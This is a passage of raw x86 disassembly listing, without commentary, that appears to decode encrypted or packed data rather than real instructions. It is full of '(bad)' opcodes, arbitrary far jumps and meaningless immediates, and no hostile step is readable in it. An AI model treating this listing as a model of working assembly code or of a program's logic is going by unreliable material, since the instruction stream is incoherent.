  4155e4:	and    edi,DWORD PTR ds:0x44160b6a
  4155ea:	pop    es
  4155eb:	and    BYTE PTR [ecx],al
  4155ed:	jbe    0x415643
  4155ef:	jb     0x415585
  4155f1:	sbb    BYTE PTR [esi],0xc7
  4155f4:	sbb    al,0xb5
  4155f6:	xchg   ebx,eax
  4155f7:	leave  
  4155f8:	mov    ebp,0xc3cd6539
  4155fd:	jp     0x41559f
  4155ff:	lock popf 
  415601:	dec    edx
  415602:	cmp    eax,0x40d2968f
  415607:	sbb    al,0xf3
  415609:	push   ss
  41560a:	fist   WORD PTR [esi+eax*1]
  41560d:	push   0xda50e043
  415612:	lds    edi,FWORD PTR [esp+eax*4+0x40]
  415616:	enter  0x2935,0xc1
  41561a:	or     bl,bh
  41561c:	ins    DWORD PTR es:[edi],dx
  41561d:	call   0x7ccb:0x882eb29b
  415624:	enter  0xf7f9,0x9
  415628:	mov    esp,0xafd9b01a
  41562d:	cmovbe ebx,DWORD PTR [ecx-0x4e]
  415631:	ror    DWORD PTR [esi+0x38fbdc3b],1
  415637:	(bad)  
  415638:	mov    ch,0x92
  41563a:	cdq    
  41563b:	jo     0x415631
  41563d:	cli    
  41563e:	xchg   ebp,eax
  41563f:	push   esp
  415640:	std    
  415641:	call   0xfdf:0x8fcafc96
  415648:	mov    cl,BYTE PTR [ebx+0x9bbb716]
  41564e:	retf   0xf009
  415651:	(bad)  
  415652:	push   ds
  415653:	or     al,0xe8
  415655:	retf   0x2875
  415658:	push   cs
  415659:	jo     0x41560d
  41565b:	or     ah,dl
  41565d:	mov    edi,DWORD PTR [ebp+esi*8+0x20]
  415661:	sub    al,dl
  415663:	jnp    0x415650
  415665:	not    DWORD PTR [eax]
  415667:	repz clc 
  415669:	imul   edx,DWORD PTR [ebp-0x5b],0x2a45e7ab
  415670:	and    ah,cl
  415672:	mov    bh,0xa5
  415674:	xor    al,BYTE PTR [ebx+0x37]
  415677:	outs   dx,BYTE PTR ds:[esi]
  415678:	xchg   ecx,eax
  415679:	push   0x3a401292
  41567e:	mov    eax,ds:0x2db9e9c9
  415683:	aad    0x8a
  415685:	jo     0x4156df
  415687:	jle    0x4156b8
  415689:	jae    0x415674
  41568b:	xchg   ecx,eax
  41568c:	add    BYTE PTR [esi],dh
  41568e:	(bad)  
  41568f:	lea    ebx,[edi]
  415691:	jbe    0x415678
  415693:	xchg   DWORD PTR [esi],eax
  415695:	fbstp  TBYTE PTR [esi]
  415697:	(bad)  
  415698:	push   edx
  415699:	mov    eax,fs
  41569b:	sub    al,ch
  41569d:	nop
  41569e:	add    al,0x66
  4156a0:	repz and al,0x20
  4156a3:	das    
  4156a4:	push   ecx
  4156a5:	dec    esi
  4156a6:	rcl    DWORD PTR [ebx],1
  4156a8:	pop    edi
  4156a9:	jp     0x415660
  4156ab:	retf   
  4156ac:	cld    
  4156ad:	mov    ebp,0x14da2f35
  4156b2:	xchg   BYTE PTR [ecx-0x16],cl
  4156b5:	test   edx,ebp
  4156b7:	es mov ecx,0xa941983b
  4156bd:	xlat   BYTE PTR ds:[ebx]
  4156be:	loop   0x415668
  4156c0:	es ds into 
  4156c3:	mov    ch,BYTE PTR [ebx]
  4156c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c6:	idiv   DWORD PTR [eax+0x6f632c5e]
  4156cc:	ret    
  4156cd:	sub    dl,BYTE PTR [esi]
  4156cf:	lods   eax,DWORD PTR cs:[esi]
  4156d1:	addr16 sar eax,cl
  4156d4:	fs add ebx,eax
  4156d7:	out    0x32,eax
  4156d9:	pop    ebp
  4156da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156db:	sbb    al,0x1d
  4156dd:	jmp    0xdff5dfc0
  4156e2:	jp     0x415704
  4156e4:	jecxz  0x415714
  4156e6:	jb     0x415716
  4156e8:	mov    eax,0xe1fb2123
  4156ed:	pop    esi
  4156ee:	rcl    BYTE PTR [esi+edi*8],1
  4156f1:	(bad)  
  4156f2:	inc    ebp
  4156f3:	inc    edi
  4156f4:	or     eax,esp
  4156f6:	inc    eax
  4156f7:	jno    0x41573e
  4156f9:	mov    ebp,0x3c9dc6e9
  4156fe:	or     bh,cl
  415700:	mov    al,ds:0x5c4817a8
  415705:	pop    edi
  415706:	out    0x36,al
  415708:	shl    DWORD PTR [eax],1
  41570a:	pop    ebx
  41570b:	sbb    bh,BYTE PTR [eax+0x40]
  41570e:	in     eax,dx
  41570f:	pop    edx
  415710:	in     eax,0xc6
  415712:	daa    
  415713:	and    edx,DWORD PTR [esi+0x36]
  415716:	icebp  
  415717:	cmp    ecx,esi
  415719:	mov    ch,0x16
  41571b:	in     eax,dx
  41571c:	add    al,0x7c
  41571e:	sbb    DWORD PTR [edx-0x33a718fc],ebx
  415724:	test   eax,0x6a9aeb31
  415729:	jne    0x41575d
  41572b:	je     0x4156ee
  41572d:	jg     0x415730
  41572f:	in     al,0xac
  415731:	loopne 0x415773
  415733:	jne    0x41576f
  415735:	jg     0x4156e7
  415737:	push   ds
  415738:	adc    al,0x63
  41573a:	in     al,dx
  41573b:	add    al,0xfb
  41573d:	aaa    
  41573e:	retf   
  41573f:	ins    DWORD PTR es:[edi],dx
  415740:	test   eax,0x92dbbefa
  415746:	hlt    
  415747:	dec    ebp
  415748:	(bad)
  41574b:	inc    ecx
  41574c:	xchg   esi,eax
  41574d:	sbb    bl,al
  41574f:	dec    ebx
  415750:	sub    DWORD PTR [edx+eiz*8-0xdbccc04],0xc00b07d8
  41575b:	push   ss
  41575c:	xchg   esp,eax
  41575d:	add    DWORD PTR [ecx+0x69],ebx
  415760:	mov    eax,0x326ad532
  415765:	dec    ebp
  415766:	sar    BYTE PTR [esi],cl
  415768:	outs   dx,DWORD PTR ds:[esi]
  415769:	xchg   esi,eax
  41576a:	jecxz  0x41571a
  41576c:	scas   eax,DWORD PTR es:[edi]
  41576d:	or     eax,0x7e20fafb
  415772:	aaa    
  415773:	pop    esp
  415774:	loope  0x4157f4
  415776:	sahf   
  415777:	push   ss
  415778:	or     BYTE PTR [ecx],0x6c
  41577b:	inc    esp
  41577c:	mov    bh,0x4e
  41577e:	xchg   ebp,eax
  41577f:	popa   
  415780:	adc    al,0x8e
  415782:	jl     0x41574f
  415784:	into   
  415785:	lds    edx,FWORD PTR [esi+0xc]
  415788:	icebp  
  415789:	fsub   QWORD PTR [ebx+0x45]
  41578c:	ins    BYTE PTR es:[edi],dx
  41578d:	sub    al,BYTE PTR [edi]
  41578f:	xchg   esp,eax
  415790:	cwde   
  415791:	lds    edi,FWORD PTR [ebp+0x3e]
  415794:	cmp    esp,esp
  415796:	test   al,0xdd
  415798:	jmp    0x415744
  41579a:	in     al,dx
  41579b:	push   cs
  41579c:	outs   dx,BYTE PTR ds:[esi]
  41579d:	push   eax
  41579e:	xchg   edi,eax
  41579f:	rcr    BYTE PTR [ebx+edi*1],cl
  4157a2:	xchg   esi,eax
  4157a3:	lahf   
  4157a4:	push   edx
  4157a5:	jge    0x4157d9
  4157a7:	in     eax,dx
  4157a8:	mov    ds:0xe6fc2ddf,eax
  4157ad:	cwde   
  4157ae:	inc    esi
  4157af:	mov    ds:0xd98f34c,eax
  4157b4:	imul   edx,DWORD PTR [ebx],0xb65473cb
  4157ba:	lods   eax,DWORD PTR ds:[esi]
  4157bb:	das    
  4157bc:	cmp    bl,cl
  4157be:	mov    al,0x72
  4157c0:	sbb    eax,DWORD PTR [eax+0x75]
  4157c3:	pop    ds
  4157c4:	mov    esi,0x8b0c8171
  4157c9:	dec    edi
  4157ca:	or     bh,cl
  4157cc:	repz cmp BYTE PTR [ecx-0x48043a20],0x57
  4157d4:	inc    ebx
  4157d5:	(bad)  
  4157d6:	jne    0x415825
  4157d8:	repnz push esp
  4157da:	fisttp WORD PTR [ecx]
  4157dc:	cmp    al,0x42
  4157de:	lock mov bl,0x2c
  4157e1:	xchg   ebx,eax
  4157e2:	sub    ebp,DWORD PTR [edx]
  4157e4:	or     DWORD PTR [ebp+0x7e377bff],esp
  4157ea:	dec    eax
  4157eb:	(bad)  
  4157ec:	clc    
  4157ed:	rcr    BYTE PTR [eax],0x3f
  4157f0:	test   al,0xc9
  4157f2:	adc    eax,DWORD PTR [edi-0x4e0fe0a7]
  4157f8:	adc    al,0x18
  4157fa:	pop    es
  4157fb:	imul   esp,esp,0x7
  4157fe:	rcr    BYTE PTR [edx-0xbd111df],0xa6
  415805:	dec    edi
  415806:	cmc    
  415807:	adc    eax,DWORD PTR [ebx]
  415809:	rcl    DWORD PTR [ebx-0x80],0xd7
  41580d:	test   al,0x43
  41580f:	pushf  
  415810:	inc    ebx
  415811:	pop    esi
  415812:	mov    ebp,0xd6717e9
  415817:	loope  0x41581e
  415819:	pop    edi
  41581a:	ds es push 0x2abe3d67
  415821:	shl    BYTE PTR [edi],1
  415823:	or     ecx,DWORD PTR [edx-0x49705b57]
  415829:	jo     0x41580c
  41582b:	cli    
  41582c:	cmp    ebx,DWORD PTR [edi-0x5716fc32]
  415832:	das    
  415833:	aas    
  415834:	inc    esi
  415835:	enter  0x64cd,0x5d
  415839:	pop    esi
  41583a:	inc    esp
  41583b:	(bad)  
  41583d:	mov    eax,ds:0x2bd9acd7
  415842:	dec    ebx
  415843:	jp     0x415827
  415845:	and    eax,0x61ffd449
  41584a:	(bad)  
  41584b:	test   DWORD PTR [eax+0x50482e6],0xf284b332
  415855:	clc    
  415856:	mov    dh,0x3f
  415858:	or     al,0x83
  41585a:	out    dx,al
  41585b:	ficom  DWORD PTR [edi+0x77a09265]
  415861:	inc    edi
  415862:	(bad)  
  415863:	stos   DWORD PTR es:[edi],eax
  415864:	stos   BYTE PTR es:[edi],al
  415865:	pop    esp
  415866:	arpl   WORD PTR [eax-0x5d],bp
  415869:	sbb    DWORD PTR [ebx+0x65414342],eax
  41586f:	outs   dx,BYTE PTR ds:[esi]
  415870:	scas   eax,DWORD PTR es:[edi]
  415871:	xchg   esp,eax
  415872:	jmp    0xdb86f29a
  415877:	repz sbb DWORD PTR [esi],ecx
  41587a:	ds add eax,0x86214bc5
  415880:	xchg   edi,eax
  415881:	pop    esp
  415882:	adc    edi,0x59
  415885:	cmp    al,bh
  415887:	aam    0xcc
  415889:	or     al,0x8b
  41588b:	scas   eax,DWORD PTR es:[edi]
  41588c:	or     DWORD PTR [ebx],esi
  41588e:	xchg   ecx,eax
  41588f:	mov    ch,0xf0
  415891:	adc    DWORD PTR [edi+0x55],ebp
  415894:	sar    DWORD PTR [esi],cl
  415896:	lock lahf 
  415898:	stos   DWORD PTR es:[edi],eax
  415899:	shl    BYTE PTR [ebp-0x5605034d],1
  41589f:	sahf   
  4158a0:	sahf   
  4158a1:	xchg   ebx,eax
  4158a2:	or     ecx,DWORD PTR [ebx]
  4158a4:	adc    edi,DWORD PTR [edi]
  4158a6:	outs   dx,DWORD PTR ds:[esi]
  4158a7:	in     al,0xe1
  4158a9:	inc    esp
  4158aa:	inc    esi
  4158ab:	pusha  
  4158ac:	mov    edi,0x1a151776
  4158b1:	and    DWORD PTR [ebx],esi
  4158b3:	lods   al,BYTE PTR ds:[esi]
  4158b4:	sub    DWORD PTR [ebp+0x4cbff4b8],edi
  4158ba:	jae    0x4158d2
  4158bc:	les    edx,FWORD PTR [edi+0x23]
  4158bf:	mov    ds:0xd47c1d8,al
  4158c4:	and    esi,ebp
  4158c6:	mov    eax,ds:0xe9bf48b6
  4158cb:	push   ebx
  4158cc:	push   cs
  4158cd:	and    DWORD PTR [edi-0x73],0x13
  4158d1:	adc    edx,edi
  4158d3:	imul   eax,DWORD PTR [edi-0x63],0x23
  4158d7:	push   ecx
  4158d8:	pop    es
  4158d9:	pushf  
  4158da:	xchg   esi,eax
  4158db:	push   edi
  4158dc:	mov    ds:0x91ddfd36,al
  4158e1:	jbe    0x415908
  4158e3:	test   eax,0x843c2718
  4158e8:	dec    eax
  4158e9:	ja     0x41592e
  4158eb:	mov    esp,0x98c818f4
  4158f0:	push   cs
  4158f1:	xchg   ebx,eax
  4158f2:	cmp    esp,DWORD PTR [esi+0x3b]
  4158f5:	icebp  
  4158f6:	in     eax,dx
  4158f7:	scas   al,BYTE PTR es:[edi]
  4158f8:	pop    edx
  4158f9:	add    ebp,esi
  4158fb:	je     0x415906
  4158fd:	pop    ebp
  4158fe:	ja     0x4158ba
  415900:	fstp   DWORD PTR [edx]
  415902:	(bad)  
  415903:	xlat   BYTE PTR ds:[ebx]
  415904:	jle    0x41596b
  415906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415907:	or     BYTE PTR [esi-0x6a],bl
  41590a:	xor    dl,BYTE PTR [ebp-0x285b1ac]
  415910:	inc    eax
  415911:	iret   
  415912:	in     al,0x1e
  415914:	inc    ebp
  415915:	mov    ah,0x29
  415917:	push   edi
  415918:	rcl    ah,0x1e
  41591b:	mov    al,ds:0x41924abe
  415920:	test   al,0xf6
  415922:	ret    0x3ae9
  415925:	add    al,0x7
  415927:	ins    DWORD PTR es:[edi],dx
  415928:	(bad)  
  415929:	dec    esp
  41592a:	jno    0x4158ca
  41592c:	fbstp  TBYTE PTR [edi-0x77fc6020]
  415932:	or     bl,BYTE PTR [eax+0x11]
  415935:	ret    0xf5c9
  415938:	dec    esp
  415939:	push   ebx
  41593a:	cmp    eax,0x76afe529
  41593f:	xor    eax,0xaca20aae
  415944:	inc    ebx
  415945:	inc    esp
  415946:	mov    ah,0x5d
  415948:	cmp    esi,DWORD PTR [eax+0x22028fce]
  41594e:	push   edi
  41594f:	mov    ebp,0x41b9a1df
  415954:	sbb    BYTE PTR [esi-0x6c4b4e16],0xb4
  41595b:	stc    
  41595c:	js     0x415907
  41595e:	pop    edx
  41595f:	hlt    
  415960:	pop    fs
  415962:	push   es
  415963:	les    edi,FWORD PTR [eax]
  415965:	cli    
  415966:	and    edx,DWORD PTR [ecx+eiz*8]
  415969:	sbb    al,0x8
  41596b:	sub    al,0x69
  41596d:	dec    ebx
  41596e:	cs repz xchg edx,eax
  415971:	aas    
  415972:	out    dx,al
  415973:	add    BYTE PTR [ecx+eax*4],bl
  415976:	push   ss
  415977:	stos   DWORD PTR es:[edi],eax
  415978:	mov    al,0x28
  41597a:	adc    BYTE PTR [ebp-0xfd7223a],bh
  415980:	xchg   BYTE PTR [eax+ecx*2+0x260a1f7f],al
  415987:	test   al,0xc0
  415989:	leave  
  41598a:	or     BYTE PTR ss:[ecx-0xb393e5d],bh
  415991:	mov    ds:0x24b50fb8,al
  415996:	into   
  415997:	gs jmp 0x415993
  41599a:	inc    edi
  41599b:	pop    ebx
  41599c:	mov    BYTE PTR [esp+ebp*4],al
  41599f:	out    0xb5,eax
  4159a1:	lea    ebx,[eax+eiz*4+0x20]
  4159a5:	add    ebp,DWORD PTR ds:[ebp-0x32]
  4159a9:	cmp    DWORD PTR [ebp+0x4cdb061a],esp
  4159af:	mov    bh,0x51
  4159b1:	lds    ebp,FWORD PTR [ecx]
  4159b3:	ret    
  4159b4:	test   BYTE PTR [edx+0x75],ch
  4159b7:	add    eax,0x99d53794
  4159bc:	test   BYTE PTR [ecx+0x485d61ac],0x41
  4159c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c4:	adc    eax,0x38e226af
  4159c9:	fadd   DWORD PTR [eax+0x75]
  4159cc:	rcl    esp,cl
  4159ce:	sar    DWORD PTR [eax],cl
  4159d0:	pushf  
  4159d1:	jmp    0xf54e:0x13ab965f
  4159d8:	cwde   
  4159d9:	pushf  
  4159da:	test   eax,0xea54edcc
  4159df:	jne    0x4159b9
  4159e1:	jns    0x4159dc
  4159e3:	lods   eax,DWORD PTR ds:[esi]
  4159e4:	or     ah,BYTE PTR [esi]
  4159e6:	out    dx,al
  4159e7:	adc    dh,BYTE PTR [ebx]
  4159e9:	pop    ds
  4159ea:	cs hlt 
  4159ec:	mov    esi,0x7db42f0
  4159f1:	mov    al,ch
  4159f3:	push   edx
  4159f4:	stc    
  4159f5:	sub    BYTE PTR [esi-0x14cf228e],0x51
  4159fc:	sub    eax,0x6f3edeb1
  415a01:	sahf   
  415a02:	mov    ah,0x90
  415a04:	ss push edx
  415a06:	adc    dl,dl
  415a08:	adc    al,0x91
  415a0a:	fs dec ebp
  415a0c:	inc    ebp
  415a0d:	ret    
  415a0e:	aas    
  415a0f:	dec    eax
  415a10:	data16 mov al,ds:0x428db459
  415a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a17:	shl    DWORD PTR [eax],1
  415a19:	mov    WORD PTR [ebp+0x29b8bad],cs
  415a1f:	xor    al,0x24
  415a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a22:	(bad)  [ebx+0x52]
  415a25:	or     bl,BYTE PTR [ebx+edi*4-0x6464db4d]
  415a2c:	jmp    0x72b2:0x79e194e8
  415a33:	jle    0x415a01
  415a35:	adc    esi,DWORD PTR [esi+0x2afa5c18]
  415a3b:	outs   dx,DWORD PTR ds:[esi]
  415a3c:	push   ss
  415a3d:	pusha  
  415a3e:	ds sbb eax,0x67a37a7b
  415a44:	aad    0x5d
  415a46:	mov    bh,0x22
  415a48:	aaa    
  415a49:	loop   0x415ac4
  415a4b:	push   edi
  415a4c:	lods   eax,DWORD PTR ds:[esi]
  415a4d:	sub    BYTE PTR [ebx+ebp*1],dh
  415a50:	cmp    DWORD PTR [ecx+0x10],0x64926f5
  415a57:	push   ecx
  415a58:	mov    cl,0xc9
  415a5a:	dec    edi
  415a5b:	das    
  415a5c:	out    dx,al
  415a5d:	push   ebp
  415a5e:	push   0xd4d0e433
  415a63:	js     0x415a37
  415a65:	in     eax,dx
  415a66:	test   DWORD PTR [ecx+esi*8-0x10],edx
  415a6a:	mov    eax,DWORD PTR [ebx]
  415a6c:	popa   
  415a6d:	adc    BYTE PTR [esi+0x64],bh
  415a70:	adc    ah,bh
  415a72:	mov    al,ds:0x3a42a659
  415a77:	pop    ecx
  415a78:	ins    BYTE PTR es:[edi],dx
  415a79:	retf   0xdad2
  415a7c:	rcl    DWORD PTR [eax+edx*2],cl
  415a7f:	shl    BYTE PTR [ebx+eax*8+0x34401035],1
  415a86:	add    eax,0x6533da61
  415a8b:	jmp    DWORD PTR [esi]
  415a8d:	jmp    0xd9c81d0e
  415a92:	jae    0x415aaa
  415a94:	mov    esi,0xc6c72eb5
  415a99:	lods   eax,DWORD PTR ds:[esi]
  415a9a:	xor    eax,0x6a986063
  415a9f:	mov    al,0xbb
  415aa1:	fstp   TBYTE PTR [ebp-0x685dd937]
  415aa7:	jo     0x415af5
  415aa9:	ret    0x88
  415aac:	push   eax
  415aad:	sti    
  415aae:	add    DWORD PTR [edx],edi
  415ab0:	imul   ebx,DWORD PTR [esi+edx*2],0x117e33ad
  415ab7:	lods   al,BYTE PTR ds:[esi]
  415ab8:	mov    ecx,0xbb2a91a1
  415abd:	es popa 
  415abf:	cmp    esp,DWORD PTR [ebx+edi*4+0x32b285bd]
  415ac6:	sbb    DWORD PTR [edx],eax
  415ac8:	push   esp
  415ac9:	enter  0x7eca,0xb5
  415acd:	mov    DWORD PTR [esi-0x6c9fdbec],eax
  415ad3:	xchg   ebp,eax
  415ad4:	test   DWORD PTR [esi],edi
  415ad6:	sbb    al,0x9e
  415ad8:	rcl    BYTE PTR [esi+0x7e],cl
  415adb:	les    eax,FWORD PTR [ebp-0x16fdd364]
  415ae1:	xor    ah,bh
  415ae3:	jmp    0x415a7d
  415ae5:	push   edi
  415ae6:	(bad)  
  415ae7:	adc    eax,0xe4ae639f
  415aec:	mov    eax,ds:0x708bb8ab
  415af1:	cmp    bl,BYTE PTR [ebx+0x39]
  415af4:	pop    ecx
  415af5:	loop   0x415aa7
  415af7:	mov    ds:0x508a493a,eax
  415afc:	xor    bl,BYTE PTR [edi-0x26]
  415aff:	dec    ebx
  415b00:	aas    
  415b01:	fistp  WORD PTR [edx]
  415b03:	add    dl,BYTE PTR [eax+0x40]
  415b06:	rcr    DWORD PTR [edx],1
  415b08:	lea    ecx,[edi]
  415b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b0b:	dec    edi
  415b0c:	push   edi
  415b0d:	jno    0x415b02
  415b0f:	and    esi,0xffffffd2
  415b12:	dec    eax
  415b13:	in     eax,0xac
  415b15:	mov    bh,0x5
  415b17:	sbb    al,0xb3
  415b19:	psubusb mm0,QWORD PTR [edx+0x14]
  415b1d:	jbe    0x415b2b
  415b1f:	push   ecx
  415b20:	mov    al,ds:0x233ce79f
  415b25:	mov    bh,0xd0
  415b27:	ret    
  415b28:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b2a:	push   es
  415b2b:	and    BYTE PTR [ebp+0x32],bl
  415b2e:	xchg   ebp,eax
  415b2f:	repz idiv al
  415b32:	stc    
  415b33:	push   esi
  415b34:	jp     0x415b84
  415b36:	repz mov eax,ds:0x46c12708
  415b3c:	sub    DWORD PTR [ecx+esi*8],0xffffffe8
  415b40:	into   
  415b41:	call   DWORD PTR [esi+0x2afb0f89]
  415b47:	rcl    DWORD PTR [ebx],0xfb
  415b4a:	imul   BYTE PTR [ebx+0x5f]
  415b4d:	xchg   DWORD PTR [ebx+ebp*8-0x10],esp
  415b51:	call   0x8da11803
  415b56:	sub    al,0xbe
  415b58:	ja     0x415ba1
  415b5a:	dec    eax
  415b5b:	push   ecx
  415b5c:	mov    cl,0xec
  415b5e:	aas    
  415b5f:	(bad)  
  415b61:	sar    BYTE PTR [ebx+0x48],1
  415b64:	pop    esi
  415b65:	in     al,dx
  415b66:	(bad)  
  415b67:	pop    edi
  415b68:	jb     0x415b15
  415b6a:	jmp    0xbc069afc
  415b6f:	add    eax,0xca8b5896
  415b74:	rcl    DWORD PTR [edx],cl
  415b76:	add    esi,esp
  415b78:	(bad)  
  415b79:	push   ebx
  415b7a:	rcr    edx,cl
  415b7c:	fidiv  WORD PTR [ebx+edx*8]
  415b7f:	repnz inc edi
  415b81:	sbb    esp,DWORD PTR [ebx-0x58]
  415b84:	mov    ch,BYTE PTR [esi+0x1bf7acb8]
  415b8a:	jns    0x415b15
  415b8c:	mov    cs,WORD PTR [edx-0x4eec1feb]
  415b92:	add    BYTE PTR [ebp-0x13],0x9c
  415b96:	(bad)  
  415b97:	sbb    eax,0xc316eef7
  415b9c:	adc    eax,DWORD PTR [ecx-0xc394d99]
  415ba2:	fwait
  415ba3:	scas   eax,DWORD PTR es:[edi]
  415ba4:	ins    BYTE PTR es:[edi],dx
  415ba5:	fs pop ebx
  415ba7:	mov    bl,0xb4
  415ba9:	out    0xb6,al
  415bab:	loop   0x415b54
  415bad:	cwde   
  415bae:	pop    ss
  415baf:	stos   DWORD PTR es:[edi],eax
  415bb0:	add    DWORD PTR [eax-0x241f6563],eax
  415bb6:	pop    ss
  415bb7:	jp     0x415b7a
  415bb9:	pop    ss
  415bba:	imul   esp,DWORD PTR [ebx+0x34],0x8d643526
  415bc1:	enter  0x6a90,0x34
  415bc5:	adc    eax,0x6c9c188
  415bca:	cmp    BYTE PTR [edx-0x4d],ah
  415bcd:	xor    ecx,DWORD PTR [esi-0x46a8c87d]
  415bd3:	imul   esi,DWORD PTR [esp+ecx*4-0x575a4d58],0xbcb51c4b
  415bde:	fwait
  415bdf:	mov    ebp,0x9f884df6
  415be4:	xchg   ebp,eax
  415be5:	int    0x95
  415be7:	push   ebp
  415be8:	mov    eax,0x225da3a
  415bed:	lods   al,BYTE PTR ds:[esi]
  415bee:	xchg   ebx,eax
  415bef:	add    ah,0x2e
  415bf2:	sbb    dh,dl
  415bf4:	jnp    0x415c05
  415bf6:	mov    eax,ds:0x72d2483a
  415bfb:	retf   0xc1fe
  415bfe:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  415c00:	mov    al,ds:0x1ea026d6
  415c05:	jns    0x415c34
  415c07:	inc    eax
  415c08:	stc    
  415c09:	std    
  415c0a:	xor    edx,esp
  415c0c:	mov    al,0xe5
  415c0e:	xlat   BYTE PTR ds:[ebx]
  415c0f:	push   DWORD PTR [edx+ebp*4]
  415c12:	fsub   QWORD PTR [ecx-0x6a5ed68]
  415c18:	and    al,0xe1
  415c1a:	test   al,0xd6
  415c1c:	scas   al,BYTE PTR es:[edi]
  415c1d:	ins    BYTE PTR es:[edi],dx
  415c1e:	mov    ds:0xb327e30,eax
  415c23:	push   ebx
  415c24:	cli    
  415c25:	add    al,al
  415c27:	mov    BYTE PTR [ebp-0x36684df8],bl
  415c2d:	sub    eax,0x16353a50
  415c32:	out    dx,eax
  415c33:	dec    esi
  415c34:	push   ebp
  415c35:	push   esp
  415c36:	outs   dx,DWORD PTR ds:[esi]
  415c37:	mov    fs,WORD PTR [eax-0x4ceca825]
  415c3d:	dec    esi
  415c3e:	xor    al,0x64
  415c40:	xchg   edi,eax
  415c41:	rol    DWORD PTR [eax+0x23],1
  415c44:	lods   al,BYTE PTR ds:[esi]
  415c45:	cmp    bh,dh
  415c47:	pusha  
  415c48:	aas    
  415c49:	jno    0x415c18
  415c4b:	pop    edx
  415c4c:	push   edx
  415c4d:	(bad)  
  415c4e:	mov    al,0x4
  415c50:	sbb    al,0x42
  415c52:	cwde   
  415c53:	(bad)  [ecx]
  415c55:	in     eax,0xa7
  415c57:	fcmovnbe st,st(5)
  415c59:	outs   dx,DWORD PTR ds:[esi]
  415c5a:	shl    BYTE PTR [esi-0x45],1
  415c5d:	popa   
  415c5e:	sbb    eax,ebp
  415c60:	cmp    edx,esp
  415c62:	aas    
  415c63:	or     al,0x3c
  415c66:	or     BYTE PTR ds:0x6f1ed966,ch
  415c6c:	popa   
  415c6d:	ror    BYTE PTR [ecx],1
  415c6f:	mov    ebp,0xdc090fec
  415c74:	mov    al,ds:0x9cd90aaf
  415c79:	jne    0x415c7b
  415c7b:	push   cs
  415c7c:	fsub   QWORD PTR [edi+0x13ce858e]
  415c82:	dec    esp
  415c83:	cwde   
  415c84:	xchg   ebp,eax
  415c85:	push   0xffffffc3
  415c87:	mov    cl,0x8
  415c89:	(bad)  
  415c8a:	pop    ecx
  415c8b:	mov    ebp,0x8f5fc283
  415c90:	pushf  
  415c91:	add    al,0xf
  415c93:	cs dec ebx
  415c95:	xor    ebp,DWORD PTR [edx+esi*2]
  415c98:	xlat   BYTE PTR ds:[ebx]
  415c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c9a:	xchg   edx,eax
  415c9b:	or     esp,ebx
  415c9d:	popf   
  415c9e:	popa   
  415c9f:	push   esp
  415ca0:	fwait
  415ca1:	push   ss
  415ca2:	(bad)  
  415ca3:	je     0x415c41
  415ca5:	xchg   edx,eax
  415ca6:	adc    ebx,DWORD PTR [ebx-0x2ae08ab]
  415cac:	lahf   
  415cad:	fisub  WORD PTR [edx]
  415caf:	(bad)  
  415cb0:	pop    edi
  415cb1:	mov    eax,ds:0xcb345253
  415cb6:	jg     0x415ca9
  415cb8:	in     al,0x40
  415cba:	es leave 
  415cbc:	xchg   edx,eax
  415cbd:	test   al,0x4e
  415cbf:	les    edi,FWORD PTR ds:0x31ee88a1
  415cc5:	jae    0x415d3e
  415cc7:	dec    ecx
  415cc8:	(bad)  
  415cc9:	push   ss
  415cca:	or     ebp,DWORD PTR [ecx]
  415ccc:	(bad)  
  415ccd:	cld    
  415cce:	repnz dec esi
  415cd0:	add    BYTE PTR [edx-0x81db162],ch
  415cd6:	jb     0x415c7c
  415cd8:	inc    esi
  415cd9:	dec    edi
  415cda:	inc    ebx
  415cdb:	mov    al,0x7b
  415cdd:	push   esp
  415cde:	xor    BYTE PTR [edx-0x5d36719d],0xda
  415ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ce6:	pop    esi
  415ce7:	and    al,0x78
  415ce9:	sar    BYTE PTR ds:[esi],1
  415cec:	sti    
  415ced:	mov    ah,0x48
  415cef:	mov    eax,0xc29ea33a
  415cf4:	xchg   esp,eax
  415cf5:	ret    0x65f7
  415cf8:	mov    bh,0x5a
  415cfa:	mov    dh,0xb2
  415cfc:	(bad)  
  415cfd:	mov    al,0x42
  415cff:	mov    ah,0x3a
  415d01:	ret    
  415d02:	mov    al,ds:0xd534de53
  415d07:	repnz add eax,0x45c5e4f4
  415d0d:	add    ch,BYTE PTR [edi+0x69]
  415d10:	mov    cl,al
  415d12:	add    BYTE PTR [esi+ebx*1-0x20],bh
  415d16:	mov    edx,esp
  415d18:	add    DWORD PTR [edx-0x1b630468],ebp
  415d1e:	and    al,0x92
  415d20:	mov    ds:0x18f2bd39,eax
  415d25:	cmp    al,0x90
  415d27:	xlat   BYTE PTR ds:[ebx]
  415d28:	push   ss
  415d29:	outs   dx,DWORD PTR ds:[esi]
  415d2a:	add    ah,BYTE PTR [edx-0x6]
  415d2d:	push   0xa3ab7063
  415d32:	xchg   DWORD PTR [eax+ebx*1+0x10fb0cce],esp
  415d39:	jecxz  0x415cec
  415d3b:	and    al,0xc7
  415d3d:	rdpmc  
  415d3f:	sub    ah,BYTE PTR [edx-0x1dfa7beb]
  415d45:	xchg   BYTE PTR [edi+0x550ca296],al
  415d4b:	arpl   WORD PTR [ebp+0x20],dx
  415d4e:	sbb    eax,0x32306382
  415d53:	rep stos DWORD PTR es:[edi],eax
  415d55:	(bad)  
  415d56:	scas   eax,DWORD PTR es:[edi]
  415d57:	test   DWORD PTR [ebp+ebx*2-0x10],0xda203255
  415d5f:	push   eax
  415d60:	mov    eax,esp
  415d62:	jg     0x415dc9
  415d64:	and    ah,BYTE PTR [ebp+ebp*8-0x580523db]
  415d6b:	in     eax,0x1e
  415d6d:	pusha  
  415d6e:	push   esi
  415d6f:	mov    esi,ecx
  415d71:	scas   al,BYTE PTR es:[edi]
  415d72:	adc    al,0x4
  415d74:	stc    
  415d75:	(bad)  
